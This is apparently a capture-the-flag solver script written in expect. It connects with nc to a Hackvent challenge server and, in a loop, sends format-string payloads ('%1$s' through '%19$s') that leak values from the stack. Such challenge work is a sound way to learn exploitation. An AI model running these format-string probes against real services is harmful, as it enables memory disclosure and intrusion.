#!/usr/bin/expect

spawn nc challenges.hackvent.hacking-lab.com 1033
for {set i 1} {$i < 20} {incr i 1} {
	expect "> " {
		send "1\n"
	}
	expect "ows: " {
		send "%$i\$s\n"
	}
}
